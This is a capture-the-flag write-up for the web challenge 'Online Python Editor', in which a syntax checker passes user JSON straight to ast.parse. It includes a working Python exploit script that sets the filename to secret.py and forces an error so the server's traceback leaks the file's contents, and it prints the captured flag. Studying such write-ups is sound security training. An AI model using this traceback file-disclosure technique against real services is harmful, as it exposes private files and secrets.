# Python Syntax Checker - CTF Challenge Writeup

## Challenge Information
- **Name**: Online Python Editor
- **Points**: 50
- **Category**: Web
- **Solves**: 92
- **Solved by**: Trendo
- **Challenge URL**: http://python.ctf.theromanxpl0.it:7001/

![image](https://github.com/user-attachments/assets/7ef50601-6533-4dd0-8990-c2713a18e832)


## Challenge Description
*"If you're tired of fast and good-looking editors, try this. Now with extra crispiness!"*

The challenge presents a deliberately "not good-looking" online Python editor that performs syntax checking on user input. Behind the scenes, it uses Python's `ast.parse()` function to validate code. The goal is to extract a flag stored in a `secret.py` file on the server.

## Technical Analysis

### Application Architecture
The application consists of several key components:

1. **Frontend (`index.html`)**
   - Provides a web-based Python code editor
   - Uses CodeMirror for syntax highlighting
   - Implements debounced syntax checking

2. **Backend (`app.py`)**
   ```python
   @app.post("/check")
   def check():
       try:
           ast.parse(**request.json)
           return {"status": True, "error": None}
       except Exception:
           return {"status": False, "error": traceback.format_exc()}
   ```

3. **Target File (`secret.py`)**
   ```python
   def main():
       print("Here's the flag: ")
       print(FLAG)
       
   FLAG = "TRX{fake_flag_for_testing}"
   main()
   ```

### Vulnerability Analysis

1. **Unsafe Parameter Handling**
   - The application accepts a `filename` parameter in the JSON payload
   - No sanitization is performed on the filename
   - The `ast.parse()` function receives raw user input

2. **Information Disclosure**
   - Error messages include full traceback information
   - File contents are exposed in error contexts
   - No sanitization of error messages before sending to client

## Exploitation

### Exploit Method

The exploit leverages two key vulnerabilities:
1. Control over the `filename` parameter to target `secret.py`
2. Error message leakage that reveals file contents

### Exploit Script
```python
import requests

TARGET_URL = "http://localhost:3000/check"

# Payload crafted to match secret.py structure
payload = {
    "source": (
        "def main():\n"
        '    print("Here\'s the flag: ")\n'
        "    print(FLAG)\n\n"
        "FLAG = \"TRX{real_flag}\"\n"  
        "invalid syntax"  # Force error after flag declaration
    ),
    "filename": "secret.py"
}

response = requests.post(TARGET_URL, json=payload)
error = response.json().get("error", "")

# Extract flag from error context
if "FLAG =" in error:
    flag_line = [line for line in error.split('\n') if 'FLAG =' in line][0]
    flag = flag_line.split('"')[1]
    print(f"FLAG CAPTURED: {flag}")
else:
    print("Error context analysis failed. Full response:")
    print(error)
```

### Exploit Breakdown

1. **Payload Structure**
   - Mirrors the structure of `secret.py`
   - Includes a deliberate syntax error after the FLAG declaration
   - Uses proper string escaping to maintain valid syntax until the target line

2. **Error Triggering**
   - The syntax error is positioned to occur after the FLAG variable definition
   - This causes Python to include the surrounding context in the error message
   - The context includes the actual flag value from the server's `secret.py`

3. **Flag Extraction**
   - The script parses the error message for lines containing "FLAG ="
   - Extracts the flag value from between quotation marks
   - Handles potential parsing failures gracefully

## Flag
`TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`
